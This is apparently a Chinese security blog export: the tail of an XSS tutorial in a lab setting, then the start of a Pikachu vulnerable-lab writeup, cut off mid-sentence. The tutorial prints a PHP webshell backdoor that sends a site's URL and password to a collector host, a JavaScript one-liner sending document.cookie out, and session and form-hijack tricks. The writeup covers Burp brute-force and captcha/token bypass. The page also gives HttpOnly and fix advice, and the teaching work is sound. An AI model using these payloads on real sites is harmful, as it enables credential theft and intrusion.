箱子管理系统</h2><p>就是使用别人的 webshell 来进行获取服务器 shell，但获取 shell 后 <strong>webshell</strong> 存在的<strong>恶意代码</strong>就会把网站信息和 webshell 密码，和用户名发到 webshell 的原主人来进行<strong>信息收集</strong>，通过大量获取的网站 shell 来进行<strong>贩卖</strong>，而使用 webshell 的人就成<strong>打工仔</strong>了。</p><p>反杀的意思就是像上面的<strong>窃取 cookie</strong> 道理一样通过向 webshell 的代码中插入窃取 cookie 的代码，当 webshell 原注入查看沙箱时就会触发 xss 窃取 cookie 来达到<strong>反客为主</strong>！</p><p>既然说到了 WebShell，推荐一个 WebShell 库：<a href="https://links.jianshu.com/go?to=https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><h3 id="（1）搭建靶场-1"><a href="#（1）搭建靶场-1" class="headerlink" title="（1）搭建靶场"></a>（1）搭建靶场</h3><h4 id="①-靶场下载"><a href="#①-靶场下载" class="headerlink" title="① 靶场下载"></a>① 靶场下载</h4><p>靶场下载：链接：<a href="https://links.jianshu.com/go?to=https://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA">https://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA</a></p><p>提取码：gay7</p><h4 id="②-小旋风下载"><a href="#②-小旋风下载" class="headerlink" title="② 小旋风下载"></a>② 小旋风下载</h4><p>搭建一个 asp 的服务器，我们这里选用小旋风进行搭建 <a href="https://links.jianshu.com/go?to=http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip">http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip</a>，下载完成后解压到虚拟机里面</p><p>默认端口为 80。如果 80 端口被占用或不想用 80 可用记事本打开 host.ini 增加端口网站服务</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-6193cf0e964286dc.png"></p><h4 id="③-靶场搭建"><a href="#③-靶场搭建" class="headerlink" title="③ 靶场搭建"></a>③ 靶场搭建</h4><p>将下载好的 webshell 箱子放在搭建好的服务器里面，这里我放到了 8001 端口下</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-53fa38123d2360e8.png"></p><p>这里存在一个问题，访问该网址时只能访问 <a href="https://links.jianshu.com/go?to=http://localhost:8001/xxx">http://localhost:8001/xxx</a> ，访问 127.0.0.1 或者内网 IP 地址都会报 <strong>418 Host Not Found</strong> 的错误</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-f322fa81c99c8c73.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-dd241a250c3a1b13.png"></p><p>经过排查终于知道是哪里出了问题，只需要将这里修改成对应的 IP 地址，重启服务即可</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-d7a346d8be743778.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-9ee83b4e07802246.png"></p><p>假如我们向 wolke.cn 传入了别人留了后门的木马，进行连接，访问了 <a href="https://links.jianshu.com/go?to=http://10.3.14.17:8001/api.asp?url=wolke.cn&pass=sqzr&id=1">http://10.3.14.17:8001/api.asp?url=wolke.cn&pass=sqzr&id=1</a> ，这个时候别人在后台就能看到我们的 webshell，坐收渔翁之利</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-dc3d7ec585fb2943.png"></p><h3 id="（2）进行攻击"><a href="#（2）进行攻击" class="headerlink" title="（2）进行攻击"></a>（2）进行攻击</h3><h4 id="①-模拟-webshell-原作者进行后门攻击"><a href="#①-模拟-webshell-原作者进行后门攻击" class="headerlink" title="① 模拟 webshell 原作者进行后门攻击"></a>① 模拟 webshell 原作者进行后门攻击</h4><p>登录后台（账号密码都为：admin）</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-701205651ade4265.png"></p><p>去找一个免杀 WebShell，然后加上我自己的后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$password = &quot;sqzr&quot;;</span><br><span class="line">$url = $_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;]; // HTTP_HOST当前请求头中 Host: 项的内容；PHP_SELF当前执行脚本的文件名</span><br><span class="line">echo &quot;&lt;script src=&#x27;http://10.3.14.17:8001/api.asp?url=$url&amp;pass=$password&amp;id=1&#x27;&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://upload-images.jianshu.io/upload_images/27650211-c5d6a0f61699079a.png"></p><p>模拟上传 WebShell 到某网站，并且进行连接触发后门</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-ac7e324ccb116180.png"></p><p>这时我们就打开 webshell 箱子发现我们的后门了（实验时发现木马路径太长，即使触发了后门也无法记录到 webshell 箱子中去）</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-10dc907529926496.png"></p><h4 id="②-反杀-webshell-原作者"><a href="#②-反杀-webshell-原作者" class="headerlink" title="② 反杀 webshell 原作者"></a>② 反杀 webshell 原作者</h4><p>有的 webshell 原作者会利用加密、编码、拼接字符等技术来隐藏 URL，因此我们使用别人的 webshell 时一定要进行代码审计</p><p>当我们代码审计获取到 webshell 沙箱的 URL 后，通过访问 webshell 沙箱来植入 XSS 代码窃取 cookie</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-986edb9f7bef1ef9.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-38463d8af92784ec.png"></p><p>此时沙箱管理员查看 PHP 信封，就会看到我们的恶意数据，同时也会触发 XSS 攻击代码</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-3312c3d7cba06c86.png"></p><p>XSS 平台新增记录</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-55e7962a1137a339.png"></p><p>使用 postman 进入后台，直接反杀</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-0b2c1af1a311799e.png"></p><h2 id="5、使用-JS-代码获取-Cookie"><a href="#5、使用-JS-代码获取-Cookie" class="headerlink" title="5、使用 JS 代码获取 Cookie"></a>5、使用 JS 代码获取 Cookie</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;script&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h1 id="六、XSS-攻击的检测"><a href="#六、XSS-攻击的检测" class="headerlink" title="六、XSS 攻击的检测"></a>六、XSS 攻击的检测</h1><ol><li><p>在目标站点上找到输入点，比如搜索栏，错误页面，留言板等。</p></li><li><p>输入一组 “特殊字符 + 唯一识别字符”，点击提交后，查看返回源码，是否做对应的处理。</p></li><li><p>通过搜索定位到唯一识别字符，结合唯一识别字符前后语法确认是否可以构造执行 js 的条件 (构造闭合)。</p></li><li><p>提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明该站点存在 XSS 漏洞。</p></li></ol><p><strong>Tips：</strong></p><ol><li><p>通常搜索栏容易出现反射型 XSS，留言板容易出现存储型 XSS；</p></li><li><p>有些网站鉴于后台可能存在过滤措施，组建的 script 可能会被过滤掉，因而无法生效或者环境限制脚本执行；</p></li><li><p>通过变化不同的 script，尝试绕过后台的过滤机制。</p></li></ol><p><strong>下图为跨站脚本攻击流程图（Cookies）</strong></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-f7e6303b98ccc601.png"></p><p>从图中可以看出：用户访问存在 XSS 漏洞的站点后触发脚本，漏洞站点给用户返回带有恶意 js 的页面；用户设备执行该恶意脚本后，攻击者即可窃取用户的数据（cookies），并伪装成用户对漏洞站点进行攻击。</p><h1 id="七、获取-Session-思路"><a href="#七、获取-Session-思路" class="headerlink" title="七、获取 Session 思路"></a>七、获取 Session 思路</h1><p>有的时候获取了 Cookie，但是少了 Session，会造成登不进后台</p><p>服务器开启了 Session 验证的话，我们只获取客户端的 Cookie 是没有办法通过验证的，</p><p>而且我们也无法获取存放在服务端的 Session</p><p>如果需要获取 Session，可以借助辅助文件，比如访问 php 探针时就会携带 Session</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-10509800dec90e18.png"></p><p>如果能利用 XSS 让管理员页面跳转到 phpinfo() 界面，通过返回源码就能窃取 Session</p><p>利用 beef 进行页面跳转</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-4b2dfe6620861148.png"></p><p>获取页面源码</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-9838ac27b57fbe3b.png"></p><p>获取源码中的 cookie 和 session</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-41bc83accb71d926.png"></p><h1 id="八、HttpOnly"><a href="#八、HttpOnly" class="headerlink" title="八、HttpOnly"></a>八、HttpOnly</h1><h2 id="1、什么是-HttpOnly"><a href="#1、什么是-HttpOnly" class="headerlink" title="1、什么是 HttpOnly"></a>1、什么是 HttpOnly</h2><p>如果 Cookie 中设置了 HttpOnly 属性，那么通过 JS 脚本将无法读取到 Cookie 信息，这样能有效防止 XSS 攻击，窃取 Cookie 内容。 但是还是存在 xss 跨站语句，阻止的仅仅是获取 cookie</p><p>各个主流的脚本语言都支持 HttpOnly</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-b9b8df4d99268093.png"></p><h2 id="2、HttpOnly-的设置样例"><a href="#2、HttpOnly-的设置样例" class="headerlink" title="2、HttpOnly 的设置样例"></a>2、HttpOnly 的设置样例</h2><h3 id="（1）JavaEE"><a href="#（1）JavaEE" class="headerlink" title="（1）JavaEE"></a>（1）JavaEE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&quot;Set-Cookie&quot;, &quot;cookiename=value;</span><br><span class="line">Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;);&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>具体参数的含义再次不做阐述，设置完毕后通过 js 脚本是读不到该 cookie 的，但使用如下方式可以读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookies[]=request.getCookies();</span><br></pre></td></tr></table></figure><h3 id="（2）C"><a href="#（2）C" class="headerlink" title="（2）C#"></a>（2）C#</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HttpCookie myCookie = new HttpCookie(&quot;myCookie&quot;); </span><br><span class="line">myCookie.HttpOnly = true; </span><br><span class="line">Response.AppendCookie(myCookie);</span><br></pre></td></tr></table></figure><h3 id="（3）VB-NET"><a href="#（3）VB-NET" class="headerlink" title="（3）VB.NET"></a>（3）VB.NET</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim myCookie As HttpCookie = new HttpCookie(&quot;myCookie&quot;) </span><br><span class="line">myCookie.HttpOnly = True </span><br><span class="line">Response.AppendCookie(myCookie)</span><br></pre></td></tr></table></figure><p>但是在 .NET 1.1 , 中您需要手动添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Cookies[cookie].Path += &quot;;HTTPOnly&quot;;</span><br></pre></td></tr></table></figure><h3 id="（4）PHP≥5-2"><a href="#（4）PHP≥5-2" class="headerlink" title="（4）PHP≥5.2"></a>（4）PHP≥5.2</h3><p>PHP5.2 以上版本已支持 HttpOnly 参数的设置，同样也支持全局的 HttpOnly 的设置，在 php.ini 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly =</span><br></pre></td></tr></table></figure><p>设置其值为 1 或者 TRUE，来开启全局的 Cookie 的 HttpOnly 属性，当然也支持在代码中来开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> ini_set(&quot;session.cookie_httponly&quot;, 1); </span><br><span class="line"> // or</span><br><span class="line"> session_set_cookie_params(0, NULL, NULL, NULL, TRUE); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Cookie 操作函数 setcookie 函数和 setrawcookie 函数也专门添加了第 7 个参数来做为 HttpOnly 的选项，开启方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); </span><br><span class="line"> setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br></pre></td></tr></table></figure><h3 id="（5）PHP4-和-PHP≤5-1"><a href="#（5）PHP4-和-PHP≤5-1" class="headerlink" title="（5）PHP4 和 PHP≤5.1"></a>（5）PHP4 和 PHP≤5.1</h3><p>对于 PHP5.1 以前版本以及 PHP4 版本的话，则需要通过 header 函数来变通下了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(&quot;Set-Cookie: hidden=value; httpOnly&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="3、反制-HttpOnly"><a href="#3、反制-HttpOnly" class="headerlink" title="3、反制 HttpOnly"></a>3、反制 HttpOnly</h2><p>当对方开启 HttpOnly 时，盗取 cookie 就会失败。登录后台的方式有 Cookie 登录和账号密码登录</p><h3 id="（1）Cookie-形式"><a href="#（1）Cookie-形式" class="headerlink" title="（1）Cookie 形式"></a>（1）Cookie 形式</h3><h3 id="（2）直接账号密码登录"><a href="#（2）直接账号密码登录" class="headerlink" title="（2）直接账号密码登录"></a>（2）直接账号密码登录</h3><h4 id="①-读取保存账号密码"><a href="#①-读取保存账号密码" class="headerlink" title="① 读取保存账号密码"></a>① 读取保存账号密码</h4><p>通过窃取保存在本地的数据（账号密码）来登录后台（需要 xss 产生于登录地址，利用表单劫持）</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-460fa3adaa6b1b4b.png"></p><p>type、id、name 通过查看网站源代码中的登录框表单</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-ae005878a4814a63.png"></p><h4 id="②-读取没保存账号密码"><a href="#②-读取没保存账号密码" class="headerlink" title="② 读取没保存账号密码"></a>② 读取没保存账号密码</h4><p>通过表单（登录框）劫持数据（产生在后台的 XSS，例如存储型 XSS 留言等）</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-72fe82ae74afacab.png"></p><p>劫持原理：抓取数据包另外发送一份到跨站平台</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-bc9738d80937373f.png"></p><p>但是如果是 https 网站的话，数据是进行了 ssl 加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法。</p><h1 id="九、安全修复方案"><a href="#九、安全修复方案" class="headerlink" title="九、安全修复方案"></a>九、安全修复方案</h1><ul><li><p>开启 HttpOnly</p></li><li><p>过滤输入：对输入进行过滤，不允许可能导致 XSS 攻击的字符输入</p></li><li><p>过滤输出：根据输出点的位置对输出到前端的内容进行适当转义</p></li><li><p>PHP（被阻断）：<a href="https://links.jianshu.com/go?to=http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a></p></li><li><p>关于 XSS 漏洞修复（JAVA）：<a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu 靶场渗透记录</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/pikachu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/pikachu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-靶场介绍"><a href="#0x01-靶场介绍" class="headerlink" title="0x01 靶场介绍"></a>0x01 靶场介绍</h1><p>Pikachu 是一个带有漏洞的 Web 应用系统，在这里包含了常见的 <a href="https://so.csdn.net/so/search?q=web%E5%AE%89%E5%85%A8&spm=1001.2101.3001.7020">web 安全</a>漏洞。 如果你是一个 Web 渗透测试学习人员且正发愁没有合适的靶场进行练习，那么 Pikachu 可能正合你意。</p><h1 id="0x02-漏洞类型"><a href="#0x02-漏洞类型" class="headerlink" title="0x02 漏洞类型"></a>0x02 漏洞类型</h1><ul><li><p>Burt Force(暴力破解漏洞)</p></li><li><p>XSS(跨站脚本漏洞)</p></li><li><p>CSRF(跨站请求伪造)</p></li><li><p>SQL-Inject(SQL 注入漏洞)</p></li><li><p>RCE(远程命令 &#x2F; 代码执行)</p></li><li><p>Files Inclusion(文件包含漏洞)</p></li><li><p>Unsafe file downloads(不安全的文件下载)</p></li><li><p>Unsafe file uploads(不安全的文件上传)</p></li><li><p>Over Permisson(越权漏洞)</p></li><li><p>…&#x2F;…&#x2F;…&#x2F;(目录遍历)</p></li><li><p>I can see your ABC(敏感信息泄露)</p></li><li><p>PHP 反序列化漏洞</p></li><li><p>XXE(XML External Entity attack)</p></li><li><p>不安全的 URL 重定向</p></li><li><p>SSRF(Server-Side Request Forgery)</p></li></ul><h1 id="0x03-WriteUP"><a href="#0x03-WriteUP" class="headerlink" title="0x03 WriteUP"></a>0x03 WriteUP</h1><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>“暴力破解” 是一攻击具手段，在 web 攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p><p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个 web 应用系统存在暴力破解漏洞，一般是指该 web 应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的 “可能性” 变的比较高。 这里的认证安全策略, 包括：</p><ol><li>是否要求用户设置复杂的密码；  </li><li>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机 otp；  </li><li>是否对尝试登录的行为进行判断和限制（如：连续 5 次错误登录，进行账号锁定或 IP 地址锁定等）；  </li><li>是否采用了双因素认证；<br>… 等等。<br>千万不要小看暴力破解漏洞, 往往这种简单粗暴的攻击方式带来的效果是超出预期的!</li></ol><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/c5067c167e6a36d7c787fe8fefb1a494.png"></p><p>开启 burp 抓包，输入 admin 和任意密码点击登录，将请求包发送至 Intruder 模块中</p><p><img src="https://img-blog.csdnimg.cn/img_convert/baf25f1f3d9f4ffdb43c43ac2eebf17a.png"></p><p>加载密码字典</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7c77d36c41de40e6857fb3ffb74ce951.png"></p><p>爆破成功，用户名<code>admin</code> 密码<code>123456</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/543768db11a394eb64487d3282e320e5.png"></p><h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过 (on server)"></a>验证码绕过 (on server)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/eead091f3000f9fd3792c51a97a4b3a3.png"></p><p>这一关需要设置下 burp 的 MIME type 过滤器，将<code>Images</code>勾选上</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b9537fa8a86cc42bd04f09349edf218f.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/802a29f72c2f4ac9dc77f32e04b6a264.png"></p><p>在 HTTP History 中可以看到以下请求，每次刷新验证码时会向服务端发送请求，响应包中 Set-Cookie 会将新的验证码返回到前端，我们可以利用这个逻辑漏洞进行暴力破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.109/inc/showvcode.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/22851ff2e94761fa371da94f0feb19fc.png"></p><p>此时前端显示的验证码确定就是响应包中返回来的值</p><p><img src="https://img-blog.csdnimg.cn/img_convert/bbc28e32ead4aa893a7c91c56106dedb.png"></p><p>要利用这个逻辑漏洞需要使用 burp 上的<code>Macros</code>功能，菜单路径如下：</p><p>Project options → Sessions → Macros</p><p>点击 Add，选中验证码刷新的请求包，点击 OK</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cde41647530a166e9a1e217d9af25c93.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/91916b89acf22982906bb3fab02ea230.png"></p><p>点击 Configure item</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c3e93e3ef2464ff344d367901aa679fa.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d4a43112ea58e7940c8b3e9d5259ca26.png"></p><p>输入参数名<code>vcode</code>（注意此处的参数名必须要与进行替换的请求包中的参数名相同），然后使用鼠标选中 Set-Cookie 中的验证码，点击 OK</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3d406336a541bf47c91d7ec8aad2466f.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b23cb7586cf24b0e603375b4b09f9186.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/9dba6876687701b7be9b1349cb2a27ac.png"></p><p>然后点击<code>Session Handling Rules</code>功能的 Add，设置 Macro 的生效范围</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fec060a781d7cdf08d00a90f782ca311.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d53c57cf8ce973e33a8f00d460125659.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/a947a89f3ed34656164c6c39964859f7.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cadd1eb1dc8907e410f5890217592398.png"></p><p>此处可以只设置 Intruder 为生效范围，然后添加 URL Scope 设置仅对指定的 URL 应用 Macros 规则</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3316fd5e6a995a74f61c64d0c3335aae.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c911aa3fc82162a869a447aee06a9143.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d5a8e9ec66a5e6f876fe76ad95732068.png"></p><p>设置好之后，同样的将登陆请求包发送至 Intruder 模块，设置密码字典进行爆破，此时通过 Intruder 模块发送出去的每个请求包的<code>vcode</code>值都会自动刷新获取并带入到请求包中</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8e8e3ef73d46f19f5f9fb2da3a40788a.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d85542e6623d85fe79518d2c17a5ae01.png"></p><p>爆破成功，用户名<code>admin</code> 密码<code>123456</code></p><blockquote><p>如果爆破失败 请重新抓取登录请求包发送到 Intruder 模块进行爆破</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/123e5e1d4b4e48787f0615ee297c28ce.png"></p><p>本关测试结束后记得将该 Session 规则关闭</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7a76868549b3f20282a60de81dd3ee41.png"></p><h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过 (on client)"></a>验证码绕过 (on client)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/e3edc83173af74a9a109fe9df28b84c7.png"></p><p>本关的验证码是前端 JS 生成，且仅在前端进行校验，只需要输入一次正确的验证码抓到请求包后将验证码删除即可重复发送登陆请求进行爆破</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7528e2159ed44fd54a1a657edb30cce5.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5aedafbd033b1c9e696588f293dcc81f.png"></p><p>将验证码参数设置为空发送请求依然能进行账号密码校验，服务端正常返回信息</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7468fe2bbcf9e1f723fb2f64e4d45d4a.png"></p><p>接下来还是老规则将请求包发送到 Intruder 模块中进行爆破即可</p><h3 id="token-防爆破"><a href="#token-防爆破" class="headerlink" title="token 防爆破?"></a>token 防爆破?</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/e1c1b515f8fddca2933e0d37b619c42d.png"></p><p><strong>第一种方式：利用 Macros</strong></p><p>本关在登录时加入了 CSRF token 机制，Token 保存在该页面的前端代码中，本关的利用方式与验证码绕过 (on server) 的相同，使用 Macros 获取前端页面的 token 值然后带入到之后的登录请求包中即可完成暴力破解</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b8acb31c219ee438888915abb34cf322.png"></p><p>新建一个 Macros 宏</p><p><img src="https://img-blog.csdnimg.cn/img_convert/4d8e9c19e6a3ca0dcbfb59c18064571b.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/55fcde7cddde2fb0b853589d858d5047.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6c9f130ed8341631d40fa94a7e1c1dce.png"></p><p>设置会话处理规则 (Session Handling Rules)</p><p><img src="https://img-blog.csdnimg.cn/img_convert/90e30a083f9a760822920e1cd987f22a.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/878b0fe03fa9998bacd95fa0129f7f5b.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7f23554cbca969337c216033949263f7.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d385ccab062ae02727add5774a483e5a.png"></p><p>然后将登陆请求包发送至 Intruder 模块中加载密码字典进行爆破即可</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f9251c577a33f1745799ad8d79c16ed2.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/dae649dfba30bf4ad2ad316e49bf68b9.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b8828264f626e29c8f2d2a478aeeccd1.png"></p><p><strong>第二种方式：利用 Intruder 的 recursive grep</strong></p><p>将请求包发送至 Intruder 模块，由于现在需要同时爆破 password 和 token 字段，所以我们此处的<code>Attack type</code>攻击模式要设置成<code>Pitchfork</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/bb35ec93ff9f6b9f9b7862d298b29164.png"></p><p>payload 设置：</p><p>payload 1 直接加载密码字典</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f2249696eb421cf15cf56c6f24d59c08.png"></p><p>payload 2 需要设置递归搜索（token）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/eadce55195125743c1923677c2d2cdc4.png"></p><blockquote><p>recursive grep，就是从上一次的响应结果中，取得部分特定内容作为下次请求的 Payload 的模式</p></blockquote><p>按照提示在 Options → Grep - Extract 处设置递归选取的内容：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/15121db3e9ac12c40232c33d37f756e1.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/0bea81bfbaba75b8e5d117dd4de6642a.png"></p><p>另外涉及递归与重定向，线程数设置为 1，重定向选项设置为 always</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2d5af7a773c7105515aa27990b8575c6.png"></p><p>老版本的 burp 线程设置方式如下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5ab04d269380a98063ced5b7248a96b3.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/86c2ef3341cc60dbdf393e3c714e493e.png"></p><p>然后回到 payload 页面点击开始爆破即可</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7d47a33bd96845f898518c36d74a927e.png"></p><h2 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS (Cross-Site Scripting)"></a>XSS (Cross-Site Scripting)</h2><p>Cross-Site Scripting 简称为 “CSS”，为避免与前端叠成样式表的缩写 “CSS” 冲突，故又称 XSS。一般 XSS 可以分为如下几种常见类型：  </p><ol><li>反射性 XSS;  </li><li>存储型 XSS;<br>3.DOM 型 XSS;</li></ol><p>XSS 漏洞一直被评估为 web 漏洞中危害较大的漏洞，在 OWASP TOP10 的排名中一直属于前三的江湖地位。</p><p>XSS 是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p><p>形成 XSS 漏洞的主要原因是程序对输入和输出没有做合适的处理，导致 “精心构造” 的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p><p>因此在 XSS 漏洞的防范上，一般会采用 “对输入进行过滤” 和“输出进行转义”的方式进行处理:</p><p>输入过滤：对输入进行过滤，不允许可能导致 XSS 攻击的字符输入;</p><p>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p><h3 id="反射型-xss-get"><a href="#反射型-xss-get" class="headerlink" title="反射型 xss(get)"></a>反射型 xss(get)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/0cf39434326ea729672d7ff67216045e.png"></p><p>输入 123 并查看前端代码，123 加载到了 p 标签中</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6de05fbca87bfd3edc52a407f13550c3.png"></p><p>尝试直接插入 